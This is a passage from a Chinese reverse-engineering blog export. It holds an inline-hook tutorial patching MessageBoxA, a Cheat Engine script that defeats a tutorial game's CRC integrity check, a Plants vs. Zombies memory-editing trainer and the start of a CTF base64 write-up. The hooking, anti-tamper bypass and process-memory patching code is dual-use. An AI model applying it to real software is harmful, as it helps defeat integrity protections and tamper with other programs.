FALSE; &#125; g_unHook = (DWORD)GetProcAddress(hMoudle, \"MessageBoxA\"); memcpy_s(g_oldCode, 5, (BYTE*)g_unHook, 5); DWORD offset = (DWORD)HookMessageBox - g_unHook - 5; memcpy_s(g_newCode + 1, 4, &amp;offset, 4); return TRUE;&#125;BOOL InstallHook() &#123; if (!g_unHook) &#123;//初始化未成功 return FALSE; &#125; Solution1(TRUE);//挂起全部其他线程 DWORD OldProtect = 0;//原来的内存属性 VirtualProtect((DWORD*)g_unHook, 5, PAGE_EXECUTE_READWRITE, &amp;OldProtect);//修改内存地址可读可写可执行 memcpy_s((DWORD*)g_unHook, 5, g_newCode, 5);//把要改变的5个字节写到函数地址里 VirtualProtect((DWORD*)g_unHook, 5, OldProtect, &amp;OldProtect);//再将内存属性改回去 Solution1(FALSE);//恢复全部其他线程 return TRUE;&#125;BOOL UnInstallHook() &#123; if (!g_unHook) &#123; return FALSE; &#125; Solution1(TRUE);//挂起其他全部线程 DWORD OldProtect = 0;//原来的内存属性 VirtualProtect((DWORD*)g_unHook, 5, PAGE_EXECUTE_READWRITE, &amp;OldProtect);//修改内存地址可读可写可执行 memcpy_s((DWORD*)g_unHook, 5, g_oldCode, 5);//把原来的5个字节写到函数地址里 VirtualProtect((DWORD*)g_unHook, 5, OldProtect, &amp;OldProtect);//再将内存属性改回去 Solution1(FALSE);//恢复其他全部线程 return TRUE;&#125;BOOL Solution1(BOOL isSuspend) &#123; HANDLE hThread = NULL; DWORD dwPid = GetCurrentProcessId(); DWORD dwTid = GetCurrentThreadId(); THREADENTRY32 stThreadEntry32; stThreadEntry32.dwSize = sizeof(THREADENTRY32); HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwPid); if (hSnapshot == INVALID_HANDLE_VALUE) &#123; return FALSE; &#125; BOOL anymore = Thread32First(hSnapshot, &amp;stThreadEntry32); while (anymore) &#123; if (stThreadEntry32.th32OwnerProcessID == dwPid &amp;&amp; stThreadEntry32.th32ThreadID != dwTid) &#123; hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, stThreadEntry32.th32ThreadID); if (!hThread) &#123; return FALSE; &#125; if (isSuspend) &#123; SuspendThread(hThread); &#125; else &#123; ResumeThread(hThread); &#125; CloseHandle(hThread); &#125; anymore = Thread32Next(hSnapshot, &amp;stThreadEntry32); &#125; CloseHandle(hSnapshot); return TRUE;&#125;方案二123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113//InlineHook.cpp#include \"InlineHook.h\"DWORD g_unHook = NULL;//保存函数地址BYTE g_oldCode[5] = &#123; 0 &#125;;//原始的5个字节BYTE g_newCode[5] = &#123; 0xE9 &#125;;//改变后的5个字节//自定义函数int WINAPI HookMessageBox( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType) &#123; UnInstallHook();//先卸载钩子，防止死循环 int result = MessageBox(NULL, TEXT(\"HOOK Success!\"), TEXT(\"Test4fun\"), MB_OK); InstallHook(); return result;&#125;BOOL InitHook() &#123; HMODULE hMoudle = LoadLibrary(\"user32.dll\"); if (!hMoudle) &#123; return FALSE; &#125; g_unHook = (DWORD)GetProcAddress(hMoudle, \"MessageBoxA\"); memcpy_s(g_oldCode, 5, (BYTE*)g_unHook, 5); return TRUE;&#125;BOOL InstallHook() &#123; if (!g_unHook) &#123;//初始化未成功 return FALSE; &#125; Solution2_Install(g_unHook, 5, (DWORD)HookMessageBox); return TRUE;&#125;BOOL UnInstallHook() &#123; if (!g_unHook) &#123; return FALSE; &#125; Solution2_Uninstall(g_unHook, 5, g_oldCode); return TRUE;&#125;BOOL Solution2_Install(DWORD originalCodeAddr, DWORD originalSize, DWORD newCodeAddr) &#123; if (originalCodeAddr == 0 || originalSize &lt; 5 || originalSize &gt; 8 || newCodeAddr == 0) &#123; return FALSE; &#125; // 设置内存写权限 DWORD dwOldProtectFlag; BOOL bRet = VirtualProtect((LPVOID)originalCodeAddr, 8, PAGE_EXECUTE_READWRITE, &amp;dwOldProtectFlag); if (!bRet) &#123; return FALSE; &#125; // 计算E9 JMP后面的4字节 = 要跳转的地址 - CALL的下一条指令的地址 DWORD dwJmpCode = newCodeAddr - (originalCodeAddr + 5); // 由于要使用InterlockedExchange64来修改8字节，故构造替换的8字节 BYTE bReplace[8] = &#123; 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 &#125;;//全部用NOP替换 bReplace[0] = 0xE9; // JMP *(PDWORD)(&amp;(bReplace[1])) = dwJmpCode;//☆体会这种语句的好处 //这里以及下面的memcpy无伤大雅，这块只是准备工作，即便不能够线程安全也无所谓 memcpy( (BYTE*)(bReplace + originalSize), (LPVOID)(originalCodeAddr + originalSize), 8 - originalSize);//把后面字节copy过来 LONG64 llReplace; memcpy(&amp;llReplace, bReplace, 8);//全都copy给一个64位的变量 // 原子操作hook InterlockedExchange64((LONG64 volatile*)originalCodeAddr, llReplace); // 恢复内存属性 VirtualProtect((LPVOID)originalCodeAddr, 8, dwOldProtectFlag, &amp;dwOldProtectFlag); return TRUE;&#125;BOOL Solution2_Uninstall(DWORD originalCodeAddr, DWORD originalSize, BYTE * oldCodeAddr) &#123; if (originalCodeAddr == 0 || originalSize &lt; 5 || originalSize &gt; 8 || oldCodeAddr == 0) &#123; return FALSE; &#125; // 设置内存写权限 DWORD dwOldProtectFlag; BOOL bRet = VirtualProtect((LPVOID)originalCodeAddr, 8, PAGE_EXECUTE_READWRITE, &amp;dwOldProtectFlag); if (!bRet) &#123; return FALSE; &#125; // 由于要使用InterlockedExchange64来修改8字节，故构造替换的8字节 BYTE bReplace[8] = &#123; 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 &#125;;//全部用NOP替换 //这里以及下面的memcpy无伤大雅，这块只是准备工作，即便不能够线程安全也无所谓 memcpy((BYTE*)bReplace, (LPVOID)(oldCodeAddr), originalSize);//还原原始的 memcpy((BYTE*)(bReplace + originalSize), (LPVOID)(originalCodeAddr + originalSize), 8 - originalSize);//把后面字节copy过来 LONG64 llReplace; memcpy(&amp;llReplace, bReplace, 8);//全都copy给一个64位的变量 // 原子操作hook InterlockedExchange64((LONG64 volatile*)originalCodeAddr, llReplace); // 恢复内存属性 VirtualProtect((LPVOID)originalCodeAddr, 8, dwOldProtectFlag, &amp;dwOldProtectFlag); return TRUE;&#125;一个用于测试的demo12345678910111213141516#include &lt;Windows.h&gt;#include &lt;iostream&gt;using namespace std;int main()&#123; HMODULE hMoudle = LoadLibrary(\"InlineHookTest.dll\"); if (hMoudle) &#123; MessageBox(NULL, TEXT(\"HOOK Failed\"), TEXT(\"test4fun\"), MB_OK);//调用MessageBox来检测 &#125; //如果HOOK成功以后，弹出的MessageBox应该是HOOK Success //否则就会是这个HOOK Failed return 0;&#125;0x04 参考《加密与解密》第四版《逆向工程核心原理》多线程inline hook多线程inline hookinline hook需要注意的问题inline hook需要注意的问题这一篇里面关于挂起线程和恢复线程的代码是存在问题的，它挂起的是所有进程的线程而非目标进程的线程，本文已经对其代码进行了修改完善，不过仍要感谢文章作者提供的思路！memcpy是否线程安全","categories":[{"name":"随手小记","slug":"随手小记","permalink":"http://liul14n.top/categories/随手小记/"}],"tags":[]},{"title":"CRC Check Bypass","slug":"CRC-Check-Bypass","date":"2022-03-17T17:35:56.000Z","updated":"2022-06-27T06:51:47.386Z","comments":true,"path":"2022/03/18/CRC-Check-Bypass/","link":"","permalink":"http://liul14n.top/2022/03/18/CRC-Check-Bypass/","excerpt":"","text":"0x00 前言太久没有更博客了，今天记录一下前段时间学到的完整性检测绕过，比如绕过CRC检测。像一些程序，总会有一些完整性检测比如CRC。当用逆向工程的方法修改程序的代码时，程序可能会做出响应的对抗操作。0x01 分析这类检测往往是对程序的代码段进行CRC检测来判断程序的代码段是否被修改，进行CRC检测有许多好处，如能防止通过修改程序代码来暴力破解一些软件等CRC校验值往往会存在内存中的某个位置CRC检测的代码也会位于代码段CRC检测几乎都会有cmp 正常情况的CRC,实际检测到的CRC然后跳转的操作。基于如上分析，不难有以下几种思路，可能有不对的地方，还望各位大佬斧正！思路一在不改变代码段的情况下，找到存放CRC校验值的内存地址，跟踪这个内存地址，找到CRC检测的相关汇编。然后去修改cmp 正常情况的CRC,实际检测到的CRC后的跳转，强行让程序往”检测无误的方向”进行跳转。本思路优点:简单粗暴，省时省力。本思路缺点:可能会有暗门。思路二在不改变代码段的情况下，找到存放CRC校验值的内存地址，跟踪这个内存地址，找到CRC检测的相关汇编。然后主动按照我们的意愿来修改代码段，然后主动用CRC算法来得到修改后的代码段的校验值，然后将这个校验值存到一个不用的内存地址中。强行修改CRC检测相关汇编的传地址过程以实现cmp 我们存的CRC校验值,实际检测到的CRC校验值的效果，按照前面的操作，我们存的CRC校验值就应该与实际检测到的CRC校验值相等，从而使得程序往”检测无误的方向”跳转。本思路优点:呃……本思路缺点:①实现过程中(主动修改代码段但还没来得及修改cmp部分时)，有可能直接触发CRC检测未通过；②实现起来较为麻烦；③用来存放我们计算得到的CRC校验值的时候，这个存放地址有可能选到奇奇怪怪的会触发异常的位置(虽然可以凭经验来选到一些好位置)思路三不改变代码段，将整个代码段复制到一个不用的内存地址，同思路一和二找到CRC检测的相关汇编这次是去修改CRC检测相关汇编的扫描起点与扫描终点，也有可能是扫描起点与扫描长度的形式让程序去扫描我们存的代码段备份，这样我们就能放心对程序的代码段进行修改了本思路优点:①这种”乾坤大挪移”的思想很爽；②用这种思路写出来的脚本的通用性较强，大部分情况下只需要修改脚本的部分内容就能实现绕过检测。本思路缺点:①实现起来略有些麻烦；②空间复杂度较高。思路四这个思路源自《加密与解密》第四版P546的⑧思路类似于思路三，只不过这次是依然检测原始部分，但执行新部分。1重新将要HOOK的模块加载到内存中,然后人为制造异常,把执行流程切换到新加载的模块中。在新加载的模块中仍然可以进行各种HOOK操作,此时守方的检测程序仍然在检测原始的模块,这样就检测不到HOOK了。0x02 Do it!以CE自带的CE Game tutorials为例，采用思路三当修改它的代码段时，标题会变成(Integrity check error)将代码段还原以后，标题就恢复正常定位与分析首先我们要找一段汇编代码段，要找出是什么访问了该汇编代码段。下面先来寻找一段代码段：这里就找一段和靶子血量相关的汇编代码吧，借助CE可以很简单地找到靶子血量的内存地址，找出什么访问了这个地址(靶子血量地址)，从而发现这么一段给靶子血量赋值的汇编代码，并记录下来这段汇编代码的地址10003F45D。接下来，我们要找到是什么一直持续访问这段汇编代码(mov eax,[rcx+70])由于我使用的无插件的CE，无法直接在Memory Viewer中右键汇编代码然后查找什么访问了这段汇编代码无奈只能手动在CE中添加这段汇编的地址确定后，进而右键-找出是什么访问了这个地址可以发现这里有三个位置持续访问该代码段。选择10003BABC处查看其反汇编不难发现rdx+rcx*2处的值应该就是待比较的值。下面需要理清一个关系，在代码段中，每条语句对于该代码段的基址的偏移是固定的，正如这句movzx edx,word ptr[rdx+rcx*2]相对于代码段的基址的偏移为0x389DC。那么同样的，如果我们将代码段复制一份到其他内存中，我们可以知道复制过去的代码段的基址，加上这个偏移，同样是可以得到这个语句！对任意代码段的语句均是如此！即复制过去的语句的地址 = 复制过去的代码段基址 + 偏移量因此，需要移花接木，让负责CRC扫描的代码去扫描我们新复制过去的代码段。故可得如下伪代码：12345678复制代码段到内存的其他位置并记录复制过去的代码段的基址addressOfCopy记录程序本身代码段的基址addressThatHoldsTheMoudleBase本身代码段的基址+代码段的大小即为代码段结束的地址addressThatHoldsTheModuleEnd对于被扫描的语句首先进行边界判断，判断其是否大于等于addressThatHoldsTheMoudleBase且小于等于addressThatHoldsTheModuleEnd然后移花接木，让CRC扫描代码去扫描这个地址（该语句地址 - addressThatHoldsTheMoudleBase + addressOfCopy）修改由于这三个位置也位于代码段，所以我们必须保证这三个位置同时被修改。下面尝试CE自带的自动汇编对这三个位置中任意一个右键-在反汇编程序中显示地址-工具-自动汇编-模板-CT表框架代码；模板-代码注入-确定即可保持这个自动汇编窗口不关闭然后依次对另外两个位置 右键-在反汇编程序中显示地址（目的主要是定位到这个位置，后续点击代码注入后框框里面直接就是这个地址了，算是借助CE的一些方便之处来省时省力了），然后模板-代码注入-确定。这么弄完以后就已经生成了82行的框架了，不得不说CE在自动汇编这块确实比方便。采用思路三，我们需要先将代码段进行一次备份。1234&#123;$lua&#125;if addressOfCopy==nil then addressOfCopy=copyMemory(getAddress(process),getModuleSize(process))end1234567891011121314&#123;$asm&#125;alloc(addressThatHoldsTheMoudleBase,8)alloc(addressThatHoldsTheModuleEnd,8)alloc(addressThatHoldsTheCopyBase,8)addressThatHoldsTheMoudleBase:dq $process //fill the address with the address of the module baseaddressThatHoldsTheModuleEnd:dq $process+getModuleSize(process)//works, otherwise we can use lua to fill this inaddressThatHoldsTheCopyBase://dq $addressOfCopy接下来就是HOOK了这里以第一个位置10003B9DC为例，写满了注释，应该比较好理解，可以结合着程序执行流程图来更好的理解。1234567891011121314151617181920212223242526272829303132333435363738//below 4 lines are automatically generated by CE alloc(newmem,2048,&quot;gtutorial-x86_64.exe&quot;+3B9DC) label(originalcode)label(exit)newmem: //this is allocated memory, you have read,write,execute access//place your code herepush rax//store rax.Then use rax as a temp register. Don&apos;t forget to restore later :)lea rax,[rdx+rcx*2]//because original code is &apos;movzx edx,word ptr [rdx+rcx*2]&apos;, we should get current scanning memory,it&apos;s currently rdx+rcx*2cmp rax,[addressThatHoldsTheMoudleBase]//Boundary checkjb originalcode//if below , means it&apos;s not insidecmp rax,[addressThatHoldsTheModuleEnd]//Boundary checkja originalcode//if above , means it&apos;s not inside//still inside the module. So we need to adjust it to our &quot;copy code&quot;sub rax,[addressThatHoldsTheMoudleBase] //get the current offsetadd rax,[addressThatHoldsTheCopyBase]//get the address of the &quot;copy code&quot;//do the original code with the new addressmovzx edx,word ptr [rax]//just use rax which points our &quot;copy code&quot;,this code just imitates the original code &apos;movzx edx,word ptr [rdx+rcx*2]&apos;xor edx,[rbp-1C]//Don&apos;t forget to write this according to original code.jmp exitoriginalcode:movzx edx,word ptr [rdx+rcx*2]xor edx,[rbp-1C]exit:pop rax//Don&apos;t forget to restore RAX :)&quot;gtutorial-x86_64.exe&quot;+3B9DC:jmp newmemnop 2关于label，它只是一个标签，可以更方便的标识一段代码，是为了能更方便的实现跳转等。接下来只需要复制粘贴，稍作修改，就能适配其他两个位置了。需要修改的地方有12所有label的位置以及jmp exit 上方那一句，那一句要根据original code来0x03 完整脚本CE脚本因为是CT脚本，应该是可以保证这些操作的原子性？不过可以确定的是，这些操作应该是可以在极短时间内（小于一个CRC检测周期与CRC检测间隔）完成，经过多次实验，并不会在脚本执行时导致检测未通过。另外，顺序是按照第三部分、第二部分、第一部分来的，这也是由于CE模板先添加了第一部分，其次才添加了第二第三部分的缘故，有FILO的味道了。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167[ENABLE]//first make sure we have a copy of the target module&#123;$lua&#125;if addressOfCopy==nil then addressOfCopy=copyMemory(getAddress(process),getModuleSize(process))end&#123;$asm&#125;alloc(addressThatHoldsTheMoudleBase,8)alloc(addressThatHoldsTheModuleEnd,8)alloc(addressThatHoldsTheCopyBase,8)addressThatHoldsTheMoudleBase:dq $process //fill the address with the address of the module baseaddressThatHoldsTheModuleEnd:dq $process+getModuleSize(process)//works, otherwise we can use lua to fill this inaddressThatHoldsTheCopyBase://dq $addressOfCopy//code from here to &apos;[DISABLE]&apos; will be used to enable the cheat//below 4 lines are automatically generated by CEalloc(newmem3,2048,&quot;gtutorial-x86_64.exe&quot;+3BABC)label(originalcode3)label(exit3)newmem3: //this is allocated memory, you have read,write,execute access//place your code herepush rax//store rax.Then use rax as a temp register. Don&apos;t forget to restore later :)lea rax,[rdx+rcx*2]//because original code is &apos;movzx edx,word ptr [rdx+rcx*2]&apos;, we should get current scanning memory,it&apos;s currently rdx+rcx*2cmp rax,[addressThatHoldsTheMoudleBase]//Boundary checkjb originalcode3//if below , means it&apos;s not insidecmp rax,[addressThatHoldsTheModuleEnd]//Boundary checkja originalcode3//if above , means it&apos;s not inside//still inside the module. So we need to adjust it to our &quot;copy code&quot;sub rax,[addressThatHoldsTheMoudleBase] //get the current offsetadd rax,[addressThatHoldsTheCopyBase]//get the address of the &quot;copy code&quot;//do the original code with the new addressmovzx edx,word ptr [rax]//just use rax which points our &quot;copy code&quot;,this code just imitates the original code &apos;movzx edx,word ptr [rdx+rcx*2]&apos;xor edx,[rbp-1C]//Don&apos;t forget to write this according to original code.jmp exit3originalcode3:movzx edx,word ptr [rdx+rcx*2]xor edx,[rbp-1C]exit3:pop rax //remember we pushed RAX?&quot;gtutorial-x86_64.exe&quot;+3BABC:jmp newmem3nop 2//below 4 lines are automatically generated by CEalloc(newmem2,2048,&quot;gtutorial-x86_64.exe&quot;+3BA4C)label(originalcode2)label(exit2)newmem2: //this is allocated memory, you have read,write,execute access//place your code herepush rax//store rax.Then use rax as a temp register. Don&apos;t forget to restore later :)lea rax,[rdx+rcx*2]//because original code is &apos;movzx edx,word ptr [rdx+rcx*2]&apos;, we should get current scanning memory,it&apos;s currently rdx+rcx*2cmp rax,[addressThatHoldsTheMoudleBase]//Boundary checkjb originalcode2//if below , means it&apos;s not insidecmp rax,[addressThatHoldsTheModuleEnd]//Boundary checkja originalcode2//if above , means it&apos;s not inside//still inside the module. So we need to adjust it to our &quot;copy code&quot;sub rax,[addressThatHoldsTheMoudleBase] //get the current offsetadd rax,[addressThatHoldsTheCopyBase]//get the address of the &quot;copy code&quot;//do the original code with the new addressmovzx edx,word ptr [rax]//just use rax which points our &quot;copy code&quot;,this code just imitates the original code &apos;movzx edx,word ptr [rdx+rcx*2]&apos;add edx,[rbp-1C]//Don&apos;t forget to write this according to original code.jmp exit2originalcode2:movzx edx,word ptr [rdx+rcx*2]add edx,[rbp-1C]exit2:pop rax&quot;gtutorial-x86_64.exe&quot;+3BA4C:jmp newmem2nop 2//below 4 lines are automatically generated by CEalloc(newmem,2048,&quot;gtutorial-x86_64.exe&quot;+3B9DC)label(originalcode)label(exit)newmem: //this is allocated memory, you have read,write,execute access//place your code herepush rax//store rax.Then use rax as a temp register. Don&apos;t forget to restore later :)lea rax,[rdx+rcx*2]//because original code is &apos;movzx edx,word ptr [rdx+rcx*2]&apos;, we should get current scanning memory,it&apos;s currently rdx+rcx*2cmp rax,[addressThatHoldsTheMoudleBase]//Boundary checkjb originalcode//if below , means it&apos;s not insidecmp rax,[addressThatHoldsTheModuleEnd]//Boundary checkja originalcode//if above , means it&apos;s not inside//still inside the module. So we need to adjust it to our &quot;copy code&quot;sub rax,[addressThatHoldsTheMoudleBase] //get the current offsetadd rax,[addressThatHoldsTheCopyBase]//get the address of the &quot;copy code&quot;//do the original code with the new addressmovzx edx,word ptr [rax]//just use rax which points our &quot;copy code&quot;,this code just imitates the original code &apos;movzx edx,word ptr [rdx+rcx*2]&apos;xor edx,[rbp-1C]//Don&apos;t forget to write this according to original code.jmp exitoriginalcode:movzx edx,word ptr [rdx+rcx*2]xor edx,[rbp-1C]exit:pop rax//Don&apos;t forget to restore RAX :)&quot;gtutorial-x86_64.exe&quot;+3B9DC:jmp newmemnop 2[DISABLE]//code from here till the end of the code will be used to disable the cheatdealloc(newmem3)&quot;gtutorial-x86_64.exe&quot;+3BABC:movzx edx,word ptr [rdx+rcx*2]xor edx,[rbp-1C]//Alt: db 0F B7 14 4A 33 55 E4dealloc(newmem2)&quot;gtutorial-x86_64.exe&quot;+3BA4C:movzx edx,word ptr [rdx+rcx*2]add edx,[rbp-1C]//Alt: db 0F B7 14 4A 03 55 E4dealloc(newmem)&quot;gtutorial-x86_64.exe&quot;+3B9DC:movzx edx,word ptr [rdx+rcx*2]xor edx,[rbp-1C]//Alt: db 0F B7 14 4A 33 55 E40x04 写在最后应该有一年多没有更博客了一年内主要在备战考研，当然也在摸鱼也算是运气不好吧，未能一战成硕二战也未必是一件坏事，能让自己改掉一些毛病比如拖延症在写这篇博客的时候，我确实感受到了学习知识然后分享知识的这种Input then output的快乐我也有太多的东西想去学习以后的日子里，我也会勤更一下博客，少摸鱼二战，好好努力，愿不负自己的努力！","categories":[{"name":"随手小记","slug":"随手小记","permalink":"http://liul14n.top/categories/随手小记/"}],"tags":[]},{"title":"My First MFC Program","slug":"My-First-MFC-Program","date":"2020-12-22T08:53:26.000Z","updated":"2020-12-22T11:53:02.753Z","comments":true,"path":"2020/12/22/My-First-MFC-Program/","link":"","permalink":"http://liul14n.top/2020/12/22/My-First-MFC-Program/","excerpt":"","text":"0x00 前言由于这几天在忙着研究外挂开发…但是很遗憾，我并不会图形化界面程序开发…昨晚开着二倍速和快进用俩小时看完了清华大学的一位教授出的Windows桌面应用程序开发教程…看完发现，用Windows桌面应用程序开发来开发一款外挂对我来说还要学不少，比如还要再去研究各种类，如Button类等，学习周期比较长。但我想尽快开发出来目标软件，这时候似乎只有VB、Delphi、MFC、易语言可以选择了。VB和Delphi我不太熟悉，易语言的话，许多年前接触过，但基本语法忘得差不多了，以后再复习吧。最终我还是选择了MFC，记得大一下学期老师让用MFC开发飞机大战，但我全程在摸鱼…用了半天大概学会了MFC开发流程，并开发出了一个简易的植物大战僵尸辅助。0x01 主要代码一些宏和全局变量12345678910//一些宏#define SUN_SHINE_BASE_ADDR 0x755E0C //阳光基址#define SUN_SHINE_OFFSET_FIRST 0x868 //一级偏移#define SUN_SHINE_OFFSET_SECOND 0x5578 //二级偏移值#define NoCD_ADDR 0x49E947//全局变量处DWORD NumOfSum;HANDLE Process;DWORD Size;启动功能是获取程序句柄，赋值给HANDLE类型的全局变量Process12345678910111213141516171819202122void CMFCTestDlg::OnBnClickedButton1()&#123; // TODO: 在此添加控件通知处理程序代码 //获取程序句柄 DWORD PID = 0; HWND hWinmine = ::FindWindow(NULL, _T(\"Plants vs. Zombies\")); //找到窗口 GetWindowThreadProcessId(hWinmine, &amp;PID); //获取进程标识 if (0 == PID) &#123; MessageBox(_T(\"获取PID失败\\n\")); exit(0); &#125; Process = OpenProcess(PROCESS_ALL_ACCESS, 0, PID); if (NULL == Process) &#123; MessageBox(_T(\"进程打开失败\\n\")); exit(0); &#125; MessageBox(_T(\"启动成功!\")); UpdateSunNum();//自定义的函数,作用是更新当前阳光值&#125;文本框目的是获取用户输入的想修改的阳光值,赋值给int型的全局变量NumOfSum123456789101112void CMFCTestDlg::OnEnChangeEdit1()&#123; // TODO: 如果该控件是 RICHEDIT 控件，它将不 // 发送此通知，除非重写 CDialogEx::OnInitDialog() // 函数并调用 CRichEditCtrl().SetEventMask()， // 同时将 ENM_CHANGE 标志“或”运算到掩码中。 // TODO: 在此添加控件通知处理程序代码 CString str; GetDlgItem(IDC_EDIT1)-&gt;GetWindowText(str); NumOfSum = StrToInt(str);&#125;修改阳光值顾名思义，根据用户在文本框中输入的阳光值来修改阳光值12345678910111213141516171819202122232425262728293031void CMFCTestDlg::OnBnClickedButton2()&#123; // TODO: 在此添加控件通知处理程序代码 if (Process == NULL) &#123; MessageBox(_T(\"请先点启动!\")); return; &#125; //修改阳光值 DWORD SunShineBaseAddressValue = 0; DWORD SunShineOffsetFirstValue = 0; DWORD SunShineNum = 0; if (0 == ReadProcessMemory(Process, (LPVOID)SUN_SHINE_BASE_ADDR, &amp;SunShineBaseAddressValue, sizeof(DWORD), &amp;Size)) &#123; MessageBox(_T(\"获取基址失败\\n\")); return; &#125; if (0 == ReadProcessMemory(Process, (LPVOID)(SunShineBaseAddressValue + SUN_SHINE_OFFSET_FIRST), &amp;SunShineOffsetFirstValue, sizeof(DWORD), &amp;Size)) &#123; MessageBox(_T(\"获取一级偏移失败\\n\")); return; &#125; if (0 == WriteProcessMemory(Process, (LPVOID)(SunShineOffsetFirstValue + SUN_SHINE_OFFSET_SECOND), &amp;NumOfSum, sizeof(DWORD), &amp;Size)) &#123; MessageBox(_T(\"内存写入失败\\n\")); return; &#125; MessageBox(_T(\"阳光值修改成功!\"));&#125;更新当前阳光值1234567891011121314151617181920212223242526272829void CMFCTestDlg::UpdateSunNum()&#123; if (Process == NULL) &#123; return; &#125; DWORD SunShineBaseAddressValue = 0; DWORD SunShineOffsetFirstValue = 0; DWORD SunShineNum = 0; if (0 == ReadProcessMemory(Process, (LPVOID)SUN_SHINE_BASE_ADDR, &amp;SunShineBaseAddressValue, sizeof(DWORD), &amp;Size)) &#123; MessageBox(_T(\"获取基址失败\\n\")); return; &#125; if (0 == ReadProcessMemory(Process, (LPVOID)(SunShineBaseAddressValue + SUN_SHINE_OFFSET_FIRST), &amp;SunShineOffsetFirstValue, sizeof(DWORD), &amp;Size)) &#123; MessageBox(_T(\"获取一级偏移失败\\n\")); return; &#125; if (0 == ReadProcessMemory(Process, (LPVOID)(SunShineOffsetFirstValue + SUN_SHINE_OFFSET_SECOND), &amp;SunShineNum, sizeof(DWORD), &amp;Size)) &#123; MessageBox(_T(\"获取二级偏移失败\\n\")); return; &#125; CString ssn; ssn.Format(_T(\"%d\"), SunShineNum); SetDlgItemText(IDC_STATIC1, ssn);&#125;计时器每秒刷新一下当前阳光值，这块因为一点小问题研究了半个多小时才搞明白….12345678910111213141516171819202122232425262728293031323334353637383940//在Resource.h定义一下Timer#define Timer1 0x01//转到xxxxxxDlg.cppBEGIN_MESSAGE_MAP(CMFCTestDlg, CDialogEx) ......//此处和下面出现的...表示我写博客的时候没把其他代码放上来,以突出重点 ON_WM_TIMER()END_MESSAGE_MAP()BOOL CMFCTestDlg::OnInitDialog()&#123; ......//同上 // TODO: 在此添加额外的初始化代码 StartTimer();&#125;// 启动timervoid CMFCTestDlg::StartTimer()&#123; SetTimer(Timer1, 1000, NULL);&#125;// 线束timervoid CMFCTestDlg::StopTimer()&#123; KillTimer(Timer1);&#125;// timer响应函数void CMFCTestDlg::OnTimer(UINT nIDEvent)&#123; switch (nIDEvent) &#123; case Timer1: UpdateSunNum();//每1秒刷新一下当前阳光值 break; default: break; &#125;&#125;无CD12345678910111213141516171819202122232425void CMFCTestDlg::OnBnClickedCheck1()&#123; // TODO: 在此添加控件通知处理程序代码 if (Process == NULL) &#123; MessageBox(_T(\"请先点启动!\")); return; &#125; CButton* pBtn = (CButton*)GetDlgItem(IDC_CHECK1); int state = pBtn-&gt;GetCheck(); if (0 == state) &#123;//未被选中 DWORD hasCD = 0x0; if (0 == WriteProcessMemory(Process, (LPVOID)(NoCD_ADDR), &amp;hasCD, sizeof(BYTE), &amp;Size)) &#123; MessageBox(_T(\"设置无CD失败 :( \\n\")); &#125; &#125; else if (1 == state) &#123;//被选中 DWORD NOCD = 0x01; if (0 == WriteProcessMemory(Process, (LPVOID)(NoCD_ADDR), &amp;NOCD, sizeof(BYTE), &amp;Size)) &#123; MessageBox(_T(\"恢复有CD失败 :( \\n\")); &#125; &#125;&#125;0x02 效果图无CD不太好放效果图。。。0x03 总结这也算是初次接触MFC吧感觉好多地方可以优化比如 每次都需要重新获取一下基址的值、一级偏移的值…这样多做了许多无用功吧，可以直接把一级偏移的值存入一个全局变量。还有一些地方我感觉写的应该不太规范吧比如没对句柄进行close….因为我没找到MFC中像Win32图形化编程里面那种switch/case中destory的情况在哪。还有些地方并没对非法输入进行处理，没有异常处理之类的。今后我会逐步改进的。","categories":[{"name":"开发","slug":"开发","permalink":"http://liul14n.top/categories/开发/"}],"tags":[]},{"title":"Base64_changed(一道比赛逆向题)","slug":"Base64-changed-一道比赛逆向题","date":"2020-11-24T09:08:11.000Z","updated":"2020-11-27T07:33:10.898Z","comments":true,"path":"2020/11/24/Base64-changed-一道比赛逆向题/","link":"","permalink":"http://liul14n.top/2020/11/24/Base64-changed-一道比赛逆向题/","excerpt":"","text":"0x00 前言被老师安排带着20级的学弟去了聊城市的”第三届山东新一代信息技术创新应用大赛–信息安全攻防赛项”做题时，我各个题目时间分配不太合理…或许我应该先帮忙把杂项做完，而不是一直在纠结这个逆向题以及pwn的libc问题…痛失一等奖pwn没给libc，用libcsearcher也不管用，导致远程一直没打通，但是事后询问了一位师傅，他直接大胆猜测libc就是2.23的…也确实打通了…看来我还是缺少经验555逆向一共3个，前俩没啥亮点，但是第三个挺难搞，虽然分值还没re2高赛后趁没课赶紧复现了一下。题目附件: 下载地址0x01 分析程序Base64_changed.exe未加任何壳，直接拖入IDA分析。来到main函数,其中有一部分符号我已经重命名了。从main函数来看，程序逻辑非常简单，先进行输入，然后对输入进行一次changed_base64_encode然后再对其结果进行一次GetIndexString操作。具体分析一下:changed_base64_encode起初我并没有对这个函数进行细看，只以为这个函数只是单纯的进行了换了表的base64_encode。但赛后复现的时候却发现了很关键的一处!这里有个+14，即对索引加了14那么为了使我们现有的base64_decode算法能正常运行(或者去直接修改base64_decode算法，但这样比较麻烦)需要手动将changed_base64_table进行了一次整体左移14位!12.rdata:00403160 ; char changed_base64_table[].rdata:00403160 changed_base64_table db 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwxyz',0本身这个base64_table就已经是被改过的，这下还要进行移位，也就相当于这次base64_encode真正用的表为OPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNGetIndexString要看懂这个函数在干什么的话，一定!一定!一定!要先理解base64算法，网上有很多详解，这里不再叙述。这个函数主要就是模拟base64加密时获取索引的操作，然后执行 索引的值+32 --&gt; ascii --&gt; 字符(虽然字符在内存中也是以二进制形式存在，但是这样描述大概能方便理解) ， 并把字符依次拼接形成字符串，最后返回这个字符串。提取出来主要算法如下:1234567891011121314v6 = 0do&#123; first = *(_BYTE *)(v7 - 